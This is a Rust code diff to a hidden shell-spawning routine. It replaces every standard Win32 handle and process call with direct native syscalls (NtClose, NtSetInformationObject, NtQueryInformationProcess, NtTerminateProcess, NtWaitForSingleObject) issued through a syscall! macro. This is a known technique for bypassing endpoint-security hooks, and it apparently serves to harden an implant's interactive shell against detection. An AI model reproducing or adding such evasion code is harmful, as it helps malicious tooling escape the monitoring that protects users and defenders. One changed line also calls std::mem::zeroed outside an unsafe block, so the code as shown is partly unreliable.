@@ -336,10 +336,9 @@ fn spawn_shell_process(
     shell_path: &str,
 ) -> Result<(PlatformProcess, PlatformPipes), String> {
     use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
-    use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
+    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
     use winapi::um::namedpipeapi::PeekNamedPipe;
     use winapi::um::processthreadsapi::*;
-    use winapi::um::synchapi::WaitForSingleObject;
     use winapi::um::winbase::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES, WAIT_OBJECT_0};
     use winapi::um::winnt::{HANDLE, PROCESS_INFORMATION, STARTUPINFOW};
 
@@ -364,22 +363,44 @@ fn spawn_shell_process(
             return Err("CreatePipe(stdin) failed".to_string());
         }
         if CreatePipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
-            CloseHandle(stdin_read);
-            CloseHandle(stdin_write);
+            let _ = syscall!("NtClose", stdin_read as u64);
+            let _ = syscall!("NtClose", stdin_write as u64);
             return Err("CreatePipe(stdout) failed".to_string());
         }
         if CreatePipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
-            CloseHandle(stdin_read);
-            CloseHandle(stdin_write);
-            CloseHandle(stdout_read);
-            CloseHandle(stdout_write);
+            let _ = syscall!("NtClose", stdin_read as u64);
+            let _ = syscall!("NtClose", stdin_write as u64);
+            let _ = syscall!("NtClose", stdout_read as u64);
+            let _ = syscall!("NtClose", stdout_write as u64);
             return Err("CreatePipe(stderr) failed".to_string());
         }
 
-        // Make the non-child ends non-inheritable.
-        SetHandleInformation(stdin_write, 1, 0); // HANDLE_FLAG_INHERIT = 1
-        SetHandleInformation(stdout_read, 1, 0);
-        SetHandleInformation(stderr_read, 1, 0);
+        // Make the non-child ends non-inheritable via NtSetInformationObject.
+        // ObjectHandleFlagInformation = 4: { Inherit, ProtectFromClose }
+        #[repr(C)]
+        struct ObjHandleFlagInfo {
+            inherit: u8,
+            protect_from_close: u8,
+        }
+        let flag_off = ObjHandleFlagInfo { inherit: 0, protect_from_close: 0 };
+        let _ = syscall!(
+            "NtSetInformationObject",
+            stdin_write as u64, 4u64,
+            &flag_off as *const _ as u64,
+            std::mem::size_of::<ObjHandleFlagInfo>() as u64,
+        );
+        let _ = syscall!(
+            "NtSetInformationObject",
+            stdout_read as u64, 4u64,
+            &flag_off as *const _ as u64,
+            std::mem::size_of::<ObjHandleFlagInfo>() as u64,
+        );
+        let _ = syscall!(
+            "NtSetInformationObject",
+            stderr_read as u64, 4u64,
+            &flag_off as *const _ as u64,
+            std::mem::size_of::<ObjHandleFlagInfo>() as u64,
+        );
     }
 
     // Build the command line as a wide string.
@@ -478,14 +499,34 @@ fn spawn_shell_process(
 
     // Close the child-side pipe handles (the child inherited them).
     unsafe {
-        CloseHandle(stdin_read);
-        CloseHandle(stdout_write);
-        CloseHandle(stderr_write);
-        // Close the process and thread handles (we keep the PID for reference).
-        CloseHandle(proc_info.hThread);
+        let _ = syscall!("NtClose", stdin_read as u64);
+        let _ = syscall!("NtClose", stdout_write as u64);
+        let _ = syscall!("NtClose", stderr_write as u64);
+        // Close the thread handle (we keep the process handle for reference).
+        let _ = syscall!("NtClose", proc_info.hThread as u64);
     }
 
-    let pid = unsafe { GetProcessId(proc_info.hProcess) };
+    // GetProcessId → NtQueryInformationProcess(ProcessBasicInformation)
+    #[repr(C)]
+    struct Pbi {
+        reserved1: *mut std::ffi::c_void,
+        peb_base_address: *mut std::ffi::c_void,
+        reserved2: [*mut std::ffi::c_void; 2],
+        unique_process_id: usize,
+        inherited_from_unique_process_id: usize,
+    }
+    let mut pbi: Pbi = std::mem::zeroed();
+    let _ = unsafe {
+        syscall!(
+            "NtQueryInformationProcess",
+            proc_info.hProcess as u64,
+            0u64, // ProcessBasicInformation
+            &mut pbi as *mut _ as u64,
+            std::mem::size_of::<Pbi>() as u64,
+            std::ptr::null_mut::<u64>() as u64,
+        )
+    };
+    let pid = pbi.unique_process_id as u32;
 
     Ok((
         PlatformProcess {
@@ -510,12 +551,12 @@ fn close_all_handles(
     f: winapi::shared::ntdef::HANDLE,
 ) {
     unsafe {
-        winapi::um::handleapi::CloseHandle(a);
-        winapi::um::handleapi::CloseHandle(b);
-        winapi::um::handleapi::CloseHandle(c);
-        winapi::um::handleapi::CloseHandle(d);
-        winapi::um::handleapi::CloseHandle(e);
-        winapi::um::handleapi::CloseHandle(f);
+        let _ = syscall!("NtClose", a as u64);
+        let _ = syscall!("NtClose", b as u64);
+        let _ = syscall!("NtClose", c as u64);
+        let _ = syscall!("NtClose", d as u64);
+        let _ = syscall!("NtClose", e as u64);
+        let _ = syscall!("NtClose", f as u64);
     }
 }
 
@@ -585,26 +626,42 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
 
 #[cfg(windows)]
 fn terminate_process(process: &PlatformProcess) {
-    use winapi::um::processthreadsapi::TerminateProcess;
     unsafe {
-        TerminateProcess(process.handle, 1);
+        let _ = syscall!(
+            "NtTerminateProcess",
+            process.handle as u64,
+            1u64, // ExitStatus
+        );
     }
 }
 
 #[cfg(windows)]
 fn close_pipes(pipes: &PlatformPipes) {
     unsafe {
-        winapi::um::handleapi::CloseHandle(pipes.stdin_write);
-        winapi::um::handleapi::CloseHandle(pipes.stdout_read);
-        winapi::um::handleapi::CloseHandle(pipes.stderr_read);
+        let _ = syscall!("NtClose", pipes.stdin_write as u64);
+        let _ = syscall!("NtClose", pipes.stdout_read as u64);
+        let _ = syscall!("NtClose", pipes.stderr_read as u64);
     }
 }
 
 #[cfg(windows)]
 fn is_process_alive(process: &PlatformProcess) -> bool {
-    use winapi::um::synchapi::WaitForSingleObject;
     unsafe {
-        WaitForSingleObject(process.handle, 0) != 0 // WAIT_OBJECT_0 = 0 means signaled (dead)
+        // NtWaitForSingleObject with timeout=0 (non-blocking).
+        // Timeout of 0 means return immediately.
+        let mut timeout: i64 = -1; // use relative timeout of -100ns (effectively 0)
+        let status = syscall!(
+            "NtWaitForSingleObject",
+            process.handle as u64,  // Handle
+            0u64,                    // Alertable = FALSE
+            &mut timeout as *mut _ as u64, // Timeout (relative, -100ns)
+        );
+        // STATUS_SUCCESS (0) = WAIT_OBJECT_0 = signaled (process exited)
+        // STATUS_TIMEOUT (0x102) = not signaled (alive)
+        if status.is_err() {
+            return false;
+        }
+        status.unwrap() != 0 // alive if NOT signaled (non-zero = timeout or other)
     }
 }
 
